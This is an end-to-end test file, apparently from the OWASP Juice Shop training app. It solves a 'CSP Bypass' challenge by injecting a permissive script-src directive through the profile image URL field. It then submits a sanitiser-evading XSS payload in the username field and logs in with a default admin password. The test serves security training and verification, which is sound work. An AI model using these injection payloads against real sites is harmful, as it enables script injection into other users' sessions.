/*
 * Copyright (c) 2014-2020 Bjoern Kimminich.
 * SPDX-License-Identifier: MIT
 */

const config = require('config')
const utils = require('../../../lib/utils')

describe('/profile', () => {
  let username, submitButton, url, setProfileImageButton

  protractor.beforeEach.login({ email: 'admin@' + config.get('application.domain'), password: 'admin123' })

  if (!utils.disableOnContainerEnv()) {
    describe('challenge "usernameXss"', () => {
      it('Username field should be susceptible to XSS attacks after disarming CSP via profile image URL', () => {
        browser.waitForAngularEnabled(false)
        browser.get(protractor.basePath + '/profile')

        const EC = protractor.ExpectedConditions
        url = element(by.id('url'))
        setProfileImageButton = element(by.id('submitUrl'))
        url.sendKeys("https://a.png; script-src 'unsafe-inline' 'self' 'unsafe-eval' https://code.getmdl.io http://ajax.googleapis.com")
        setProfileImageButton.click()
        browser.driver.sleep(5000)
        username = element(by.id('username'))
        submitButton = element(by.id('submit'))
        username.sendKeys('<<a|ascript>alert(`xss`)</script>')
        submitButton.click()
        browser.wait(EC.alertIsPresent(), 10000, "'xss' alert is not present on /profile")
        browser.switchTo().alert().then(alert => {
          expect(alert.getText()).toEqual('xss')
          alert.accept()
        })
        username.clear()
        username.sendKeys('?????') // disarm XSS
        submitButton.click()
        url.sendKeys(browser.baseUrl + '/assets/public/images/uploads/default.svg')
        setProfileImageButton.click()
        browser.driver.sleep(5000)
        browser.get(protractor.basePath + '/#/')
        browser.waitForAngularEnabled(true)
      })
      protractor.expect.challengeSolved({ challenge: 'CSP Bypass' })
    })
  }
})